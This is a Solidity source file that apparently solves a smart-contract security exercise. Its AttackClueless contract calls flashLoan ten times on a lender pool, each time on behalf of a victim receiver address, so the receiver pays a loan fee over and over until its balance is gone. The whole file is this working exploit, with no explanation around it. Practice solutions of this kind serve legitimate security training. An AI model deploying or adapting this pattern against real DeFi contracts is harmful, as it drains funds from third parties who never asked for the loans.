// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ICluelessLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackClueless {

    constructor(address poolAddress, address receiverAdress) {
        ICluelessLenderPool pool = ICluelessLenderPool(poolAddress);
        pool.flashLoan(receiverAdress, 1);
        pool.flashLoan(receiverAdress, 2);
        pool.flashLoan(receiverAdress, 3);
        pool.flashLoan(receiverAdress, 4);
        pool.flashLoan(receiverAdress, 5);
        pool.flashLoan(receiverAdress, 6);
        pool.flashLoan(receiverAdress, 7);
        pool.flashLoan(receiverAdress, 8);
        pool.flashLoan(receiverAdress, 9);
        pool.flashLoan(receiverAdress, 10);
    }

}